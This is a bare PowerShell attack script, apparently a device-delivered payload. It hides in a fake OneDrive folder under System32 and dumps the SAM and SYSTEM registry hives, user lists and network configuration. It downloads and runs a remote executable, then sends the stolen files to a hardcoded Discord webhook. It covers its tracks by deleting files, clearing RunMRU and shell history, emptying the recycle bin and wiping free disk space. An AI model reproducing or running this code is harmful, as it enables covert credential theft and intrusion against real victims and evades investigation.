cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save
iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
start-sleep 5


function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1192166527349297252/Xab8cQEs3AOljl1CVwtuxzIxPZNVbuZQ6B6Q1nlfIvw8MBlRjT0pl1tBeVnt95GY4nOp'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save


rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe" -r -Force -ErrorAction SilentlyContinue

function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
start powershell -argumentlist '-windowstyle hidden cipher /w:c'
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit
